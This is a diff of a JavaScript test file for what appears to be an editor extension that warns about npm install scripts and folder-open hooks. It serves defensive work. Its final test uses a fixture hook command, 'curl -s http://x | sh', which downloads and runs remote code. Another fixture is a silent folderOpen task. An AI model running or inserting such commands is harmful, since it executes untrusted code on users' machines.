@@ -4,7 +4,7 @@ const assert = require('node:assert');
 const {
   findDepLine, findYamlKeyLine, diagnosticsForPackageJson, diagnosticsForWorkspaceYaml,
   summarize, parseAudit, readDecisions, decisionFor, parseAllowBuilds, stateFor,
-  condenseSignals, readableSignal, messageFor, projectDirOf,
+  condenseSignals, readableSignal, messageFor, explainFor, capabilitiesOf, projectDirOf, ACTIONS_SLOT,
 } = require('../src/core');
 const nodePath = require('node:path');
 
@@ -151,8 +151,8 @@ test('an allowlisted package produces no warning, only an override marker', () =
   const diags = byName(diagnosticsForPackageJson(decided, RESULTS, { recommended: RECOMMENDED }));
   assert.strictEqual(diags.sharp.state, 'override');
   assert.strictEqual(diags.sharp.severity, 'information', 'a settled risk acceptance is not a warning');
-  assert.ok(diags.sharp.message.includes('allowed in your allowlist'));
-  assert.ok(diags.sharp.message.includes('node-gyp'), 'the evidence is still shown');
+  assert.ok(diags.sharp.message.includes('Your allowlist approves it'));
+  assert.ok(diags.sharp.explain.includes('node-gyp'), 'the raw evidence is still one hover away');
 });
 
 test('denying a package silences it entirely: the script never runs', () => {
@@ -164,7 +164,8 @@ test('undecided packages warn, and say what to do about it', () => {
   const diags = byName(diagnosticsForPackageJson(PKG, RESULTS, { recommended: RECOMMENDED }));
   assert.strictEqual(diags.sharp.state, 'decide');
   assert.strictEqual(diags.sharp.severity, 'warning');
-  assert.ok(diags.sharp.message.includes('undecided'), 'the message names the action');
+  assert.ok(diags.sharp.message.includes('You have not approved or blocked it yet'), 'the message says what is outstanding');
+  assert.ok(diags.sharp.message.includes('runs other programs'), 'and what the script does, in words');
   assert.ok(diags.esbuild && diags.esbuild.line === 9);
   assert.ok(!diags.chalk, 'package with no install script produces no diagnostic');
   assert.ok(!diags['noop-hooks'], 'install script that analyzed SAFE produces no diagnostic');
@@ -190,8 +191,8 @@ test('malicious package in the manifest is an error, allowlisted or not', () => 
   assert.strictEqual(d.name, 'evilpkg');
   assert.strictEqual(d.severity, 'error');
   assert.strictEqual(d.state, 'alarm');
-  assert.ok(d.message.includes('⛔ MALICIOUS') && d.message.includes('MAL-2026-1'));
-  assert.ok(d.message.includes('cannot make this safe'));
+  assert.ok(d.message.includes('reported malicious') && d.message.includes('MAL-2026-1'));
+  assert.ok(d.message.includes('Allowlisting cannot make it safe'));
 });
 
 test('a package that could not be analyzed still surfaces, at any risk label', () => {
@@ -200,7 +201,8 @@ test('a package that could not be analyzed still surfaces, at any risk label', (
     [{ name: 'broken', version: '1.0.0', risk, error: 'tarball 404', rows: [] }])[0];
   // what the CLI actually emits (reporter.packageRisk → 'ERROR')
   assert.strictEqual(one('ERROR').severity, 'information');
-  assert.ok(one('ERROR').message.includes('could not be analyzed: tarball 404'));
+  assert.ok(one('ERROR').message.includes('could not be analyzed (tarball 404)'));
+  assert.ok(one('ERROR').message.includes('unknown'), 'an unanalyzed package is not reported as clean');
   // ...and the SAFE-drop rule must never swallow a fetch failure. "we could not
   // find out what this does" must not render as a Hint just because the risk
   // field defaulted to SAFE. A Hint is a dotted underline nobody reads.
@@ -214,7 +216,7 @@ test('transitive packages anchor on the direct dependency that pulled them in', 
   const [d] = diagnosticsForPackageJson(PKG, [deep], { recommended: {} });
   assert.strictEqual(d.line, findDepLine(PKG, 'sharp'), 'anchored on the direct dep, not dropped');
   assert.deepStrictEqual(d.via, ['sharp']);
-  assert.ok(d.message.includes('protobufjs@7.6.5 (via sharp)'), 'the message names the path in');
+  assert.ok(d.message.includes('protobufjs@7.6.5 (pulled in by sharp)'), 'the message names the path in');
 
   // a package reachable from nothing in this manifest still has nowhere to go
   const orphan = { ...deep, via: ['not-a-dep'] };
@@ -293,11 +295,57 @@ test('condenseSignals drops repeats and longer spellings of the same command', (
   );
 });
 
-test('messageFor caps the signal list with a countable remainder', () => {
-  const signals = Array.from({ length: 9 }, (_, i) => `fs: op${i}`);
-  const msg = messageFor({ name: 'x', version: '1', risk: 'MEDIUM', rows: [{ signals }] }, 'override');
-  assert.ok(msg.includes('fs: op5') && !msg.includes('fs: op6'));
-  assert.ok(msg.includes('+3 more'));
+// --- plain English ---------------------------------------------------------
+
+test('capabilitiesOf groups signals by what they let the script do, strongest first', () => {
+  const caps = capabilitiesOf([{ signals: ['fs: chmodSync', 'env: process.env', 'exec: sw_vers', 'exec: npm install'] }]);
+  assert.deepStrictEqual(caps.map((c) => c.kind), ['exec', 'fs', 'env'], 'ordered as analyzer score() checks them');
+  assert.deepStrictEqual(caps[0].examples, ['sw_vers', 'npm install'], 'the raw signals survive as evidence');
+  assert.deepStrictEqual(capabilitiesOf([{ signals: ['weird thing'] }]), [],
+    'an unrecognised prefix is not invented into a capability');
+});
+
+test('messageFor says what the script can do, not which functions it calls', () => {
+  const esbuild = {
+    name: 'esbuild',
+    version: '0.27.3',
+    risk: 'HIGH',
+    rows: [{ signals: ['env: process.env', 'exec: child_process.execFileSync()', 'fs: fs2.chmodSync', 'net: fetch()'] }],
+  };
+  const msg = messageFor(esbuild, 'decide', ['vite']);
+  assert.ok(msg.startsWith('esbuild@0.27.3 (pulled in by vite) runs code when you install it'), msg);
+  assert.ok(msg.includes('runs other programs, uses the network and reads and writes files'), msg);
+  assert.ok(!msg.includes('execFileSync'), 'raw signals belong in the hover, not in the squiggle');
+  assert.ok(!msg.includes('environment variables'), 'capabilities are capped at the three that set the risk');
+  assert.ok(msg.endsWith('You have not approved or blocked it yet.'), msg);
+});
+
+test('explainFor carries the evidence and says why the risk landed where it did', () => {
+  const sharp = {
+    name: 'sharp',
+    version: '0.33.5',
+    risk: 'HIGH',
+    rows: [{ signals: ['exec: node-gyp rebuild', 'exec: prebuild-install', 'exec: sw_vers', 'env: process.env'] }],
+  };
+  const md = explainFor(sharp, 'decide', ['vite']);
+  assert.ok(md.includes('`vite` pulls it in'), md);
+  assert.ok(md.includes('`node-gyp rebuild`') && md.includes('+1 more'), md);
+  assert.ok(md.includes('Rated **HIGH**: it runs other programs'), md);
+  assert.ok(md.includes('**What to do**'), 'every explanation ends in something to do');
+
+  // the risk driver is whichever capability scored it, never just the first signal seen
+  const netOnly = explainFor({ name: 'x', version: '1', risk: 'MEDIUM', rows: [{ signals: ['fs: writeFile', 'net: fetch()'] }] });
+  assert.ok(netOnly.includes('Rated **MEDIUM**: it uses the network'), netOnly);
+
+  // The decide buttons sit right under the opening sentence, and everything
+  // below them is optional reading. Screenshots of the finished hover showed
+  // it clipped by the hover height cap with only about six lines visible, so
+  // anything further down is something a reader may simply never see.
+  const slotAt = md.indexOf(ACTIONS_SLOT);
+  assert.ok(slotAt > md.indexOf('Installing it runs'), 'buttons must follow the opening sentence');
+  assert.ok(slotAt < md.indexOf('- runs other programs'), 'buttons must precede the evidence list');
+  assert.ok(slotAt < md.indexOf('**What to do**'), 'buttons must precede the closing prose');
+  assert.ok(md.split('\n').length <= 18, `hover is ${md.split('\n').length} lines, it will be clipped`);
 });
 
 // --- status bar ------------------------------------------------------------
@@ -308,9 +356,9 @@ test('summarize leads with the number that needs a decision', () => {
   assert.ok(sum.text.includes('malicious'), 'malicious dominates the summary');
 
   const noEvil = RESULTS.filter((r) => !r.malicious);
-  assert.strictEqual(summarize(noEvil, { recommended: RECOMMENDED }).text, '🔴 2 install scripts to review');
+  assert.strictEqual(summarize(noEvil, { recommended: RECOMMENDED }).text, '2 install scripts to review');
   assert.strictEqual(summarize(noEvil, { recommended: RECOMMENDED }).undecided, 2);
-  assert.strictEqual(summarize([]).text, '🟢 install scripts clean');
+  assert.strictEqual(summarize([]).text, 'no install scripts');
 });
 
 test('summarize goes quiet once every scripted dep is decided', () => {
@@ -320,7 +368,7 @@ test('summarize goes quiet once every scripted dep is decided', () => {
   assert.strictEqual(sum.undecided, 0);
   assert.strictEqual(sum.overrides, 2);
   assert.strictEqual(sum.scripted, 3);
-  assert.strictEqual(sum.text, '🟢 3 scripted deps, none to review (2 overrides)');
+  assert.strictEqual(sum.text, '3 install scripts, all decided (2 overrides)');
 });
 
 test('summarize counts SAFE scripted deps, which never get a diagnostic', () => {
@@ -333,8 +381,8 @@ test('summarize counts SAFE scripted deps, which never get a diagnostic', () => 
   assert.strictEqual(sum.counts.SAFE, 2);
   assert.strictEqual(sum.scripted, 2);
   assert.strictEqual(sum.bad, 0);
-  assert.strictEqual(sum.text, '🟢 2 scripted deps, none to review');
-  assert.strictEqual(summarize([safeScripted[0]]).text, '🟢 1 scripted dep, none to review');
+  assert.strictEqual(sum.text, '2 install scripts, all decided');
+  assert.strictEqual(summarize([safeScripted[0]]).text, '1 install script, all decided');
 });
 
 // --- CLI envelope ----------------------------------------------------------
@@ -351,7 +399,7 @@ test('parseAudit keeps the recommendation alongside the results', () => {
 
 // --- open-time hooks (CLI 1.8.0 `hooks --json`) -----------------------------
 
-const { isHookFile, parseHooks, hookMessage, diagnosticsForHooksFile } = require('../src/core');
+const { isHookFile, parseHooks, hookMessage, hookExplain, diagnosticsForHooksFile } = require('../src/core');
 
 const HOOK_FINDINGS = [
   { file: '.vscode/tasks.json', line: 4, surface: 'vscode-task', kind: 'command', auto: true, label: 'eslint-check', command: 'node .vscode/setup.mjs', silent: true, signals: ['exec: node .vscode/setup.mjs (file not present)'], risk: 'HIGH' },
@@ -382,8 +430,8 @@ test('diagnosticsForHooksFile: HIGH is a warning on the 0-based line, only for i
   assert.strictEqual(vs.length, 1);
   assert.strictEqual(vs[0].line, 3);
   assert.strictEqual(vs[0].severity, 'warning');
-  assert.ok(vs[0].message.includes('folderOpen task "eslint-check"'));
-  assert.ok(vs[0].message.includes('silently'), 'reveal: silent is called out');
+  assert.ok(vs[0].message.includes('Opening this folder runs the task “eslint-check”'));
+  assert.ok(vs[0].message.includes('with no terminal shown'), 'reveal: silent is called out');
 
   const cl = diagnosticsForHooksFile('.claude/settings.json', HOOK_FINDINGS);
   assert.strictEqual(cl.length, 3);
@@ -394,7 +442,7 @@ test('diagnosticsForHooksFile: HIGH is a warning on the 0-based line, only for i
   assert.ok(pre.message.includes('agent-triggered'));
   const http = cl.find((d) => d.message.includes('http hook'));
   assert.strictEqual(http.severity, 'information');
-  assert.ok(http.message.includes('not shell command execution'));
+  assert.ok(http.message.includes('does not run a shell command'));
 });
 
 test('diagnosticsForHooksFile: a partial file gets one note, warning when rawHit', () => {
@@ -411,6 +459,11 @@ test('diagnosticsForHooksFile: a partial file gets one note, warning when rawHit
 });
 
 test('hookMessage: shipped-in-dependency findings say so', () => {
-  const msg = hookMessage({ surface: 'vscode-task', label: 'eslint-check', command: 'echo hello', risk: 'HIGH', fromDep: 'evil-open@1.0.0', signals: [] });
-  assert.ok(msg.includes('shipped in evil-open@1.0.0'), msg);
+  const f = { surface: 'vscode-task', label: 'eslint-check', command: 'curl -s http://x | sh', risk: 'HIGH', fromDep: 'evil-open@1.0.0', signals: ['net: curl -s http://x'] };
+  const msg = hookMessage(f);
+  assert.ok(msg.includes('it shipped inside evil-open@1.0.0'), msg);
+  assert.ok(msg.includes('It uses the network.'), msg);
+  const md = hookExplain(f);
+  assert.ok(md.includes('curl -s http://x | sh'), 'the command itself is the evidence');
+  assert.ok(md.includes('**evil-open@1.0.0**') && md.includes('**What to do**'), md);
 });
